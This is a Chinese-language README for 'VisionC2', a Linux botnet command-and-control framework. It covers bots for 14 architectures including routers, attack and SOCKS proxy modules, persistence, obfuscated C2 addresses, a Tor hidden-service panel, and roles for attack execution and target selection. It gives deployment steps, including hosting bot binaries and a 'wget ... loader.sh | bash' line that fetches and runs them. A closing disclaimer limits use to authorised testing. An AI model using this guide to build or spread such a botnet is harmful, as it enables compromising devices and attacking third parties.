<div align="center">

# VisionC2

### 高级 Linux C2 框架 - 模块化、加密、跨架构

<br>

| | |
|:-:|:-:|
| **模块化 Bot 构建**<br>可在编译时选择载荷能力：完整攻击模块、SOCKS5 代理网格、轻量远程 Shell，或组合启用。| **全静态二进制**<br>所有 Bot 二进制均面向 Linux 静态链接，覆盖旧路由器、uClibc 嵌入式设备、最小化容器等环境，支持 14 种架构。 |
| **全链路加密**<br>Bot 与 CNC 使用 443 端口 TLS。配置使用 AES-256-CTR 加密，每次构建生成唯一密钥；C2 地址经过 Base64、XOR、RC4、字节替换、MD5 校验、AES-CTR 等多层处理；连接使用 HMAC 挑战响应认证。 | **3 种控制界面**<br>Tor 隐藏服务 Web 面板、本地 Go TUI、远程 Telnet CLI。三种入口共用 `users.json`，支持多级权限控制。 |

<br>

[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![Platform](https://img.shields.io/badge/Platform-Linux-009688?style=for-the-badge&logo=linux&logoColor=white)]()
[![Architectures](https://img.shields.io/badge/Architectures-14-blueviolet?style=for-the-badge)](#bot-部署)
[![Changelog](https://img.shields.io/badge/Changelog-Docs-f59e0b?style=for-the-badge)](Docs/CHANGELOG.md)

</div>

---

## 目录

- [快速开始](#快速开始)
- [架构概览](#架构概览)
- [Bot 部署](#bot-部署)
- [控制界面](#控制界面)
- [文档](#文档)
- [法律声明](#法律声明)

---

## 快速开始

### 系统要求

| 项目 | 最低要求 | 推荐配置 |
|------|----------|----------|
| **内存** | 512MB | 2GB+ |
| **存储** | 1GB | 10GB+ |
| **网络** | 允许 443 入站 | 静态公网 IP |
| **系统** | Ubuntu 20.04+ | Ubuntu 22.04+ |

### 安装依赖

```bash
sudo apt update && sudo apt install -y openssl git wget python3 screen tor upx-ucl

# 安装 Go 1.24+
wget https://go.dev/dl/go1.24.1.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.1.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

### 一键初始化

```bash
git clone https://github.com/xing-kalip/VisionC2.git && cd VisionC2
python3 setup.py
```

选择 **[1] 完整初始化**，按交互向导填写：

- C2 服务器地址（IP 或域名）
- 管理界面端口
- TLS 证书信息
- Bot 模块选择（攻击 / SOCKS / 两者 / 仅管理）

### 构建产物

初始化完成后会生成：

```text
VisionC2/
├── bins/              # 14 个 Bot 二进制，每个架构一个
├── server             # CNC 控制端二进制
├── relay_server       # SOCKS 中继服务端二进制
├── cnc/certificates/  # TLS 密钥对
└── setup_config.txt   # 完整配置备份
```

### 启动 CNC 服务端

```bash
./server              # 交互式启动器，启动时选择模式
./server --tui        # 直接进入 TUI 模式
./server --split      # 管理端口上的 Telnet CLI
./server --daemon     # 无本地 UI 的后台模式
```

持久运行示例：`screen -S vision ./server`，使用 `Ctrl+A D` 分离会话。

---

## 初始化选项

| 选项 | 说明 |
|------|------|
| **[1] 完整初始化** | 生成新的 C2 地址、AES 密钥、令牌、证书并构建 Bot |
| **[2] 仅更新 C2 URL** | 只修改 C2 地址，保留 magic code、证书和令牌 |
| **[3] 更新模块并重建** | 修改 Bot 模块选择，其他配置保持不变 |
| **[4] 从 setup_config.txt 恢复** | `git pull` 或重新克隆后恢复保存的配置 |

---

## 架构概览

```text
Operator / Browser / TUI / Telnet
            |
            | Tor Hidden Service / TLS
            v
        CNC Server
            |
            | TLS 1.3 / 443
            v
    Bot Agents across architectures
```

| 组件 | 路径 | 作用 |
|------|------|------|
| **CNC 服务端** | `cnc/` | Bot TLS 接入、Tor Web 面板、TUI、Telnet CLI、权限控制 |
| **Bot Agent** | `bot/` | 远程代理，包含 TLS、C2 解码、持久化、可选攻击/SOCKS 模块 |
| **SOCKS 中继** | `cnc/relay/` | Bot 反连中继，用户通过 SOCKS5 端口接入 |
| **工具脚本** | `tools/` | 构建、加密辅助、部署 loader |

---

## Bot 部署

### 1. 托管二进制

```bash
sudo apt install -y apache2
sudo cp bins/* /var/www/html/bins/
sudo systemctl start apache2
```

### 2. 配置 Loader

编辑 `tools/loader.sh` 第 3 行：

```bash
SRV="http://<your-server-ip>/bins"
```

### 3. 执行部署

```bash
wget -qO- http://your-server/loader.sh | bash
```

支持架构：x86、x86_64、ARM v5/v6/v7、ARM64、MIPS、MIPS64、PPC64、s390x、RISC-V。

---

## 控制界面

| 界面 | 访问方式 | 适用场景 |
|------|----------|----------|
| **Tor Web 面板** | Tor Browser 访问 `.onion` | 完整图形界面、Bot 管理、Shell、SOCKS、用户管理 |
| **Go TUI** | `./server --tui` | 本地终端交互、实时 Bot 视图 |
| **Telnet CLI** | `./server --split` | 轻量远程访问、多用户、脚本化操作 |

### 权限控制

| 角色 | 权限 |
|------|------|
| **Owner/Admin** | 完整系统控制、用户管理 |
| **Pro** | 攻击执行和目标选择 |
| **Basic** | 基础监控和受限操作 |

---

## 文档

| 文档 | 说明 |
|------|------|
| [`ARCHITECTURE.md`](Docs/ARCHITECTURE.md) | 系统设计、加密层、协议流程 |
| [`CHANGELOG.md`](Docs/CHANGELOG.md) | 版本历史 |
| [`COMMANDS.md`](Docs/COMMANDS.md) | TUI / Web / CLI 快捷键和命令参考 |
| [`SETUP.md`](Docs/SETUP.md) | 安装和配置指南 |
| [`PROXY.md`](Docs/PROXY.md) | SOCKS5 中继部署指南 |

---

## 排障

- Go 未找到：确认 `/usr/local/go/bin` 已加入 `PATH`
- 443 端口权限不足：`sudo setcap 'cap_net_bind_service=+ep' ./server`
- Bot 无法连接：检查防火墙、C2 地址、TLS 连通性和 `setup_config.txt`
- Tor 面板无法访问：检查 `tor` 服务和 hidden service 配置

---

## 法律声明

**仅限已授权的安全研究、渗透测试和教学环境。**

未经明确授权对第三方系统使用本工具是违法行为。使用者需自行确保所有测试均已获得书面授权，并遵守所在地法律法规。开发者不对滥用、未授权访问或由此造成的任何损害承担责任。
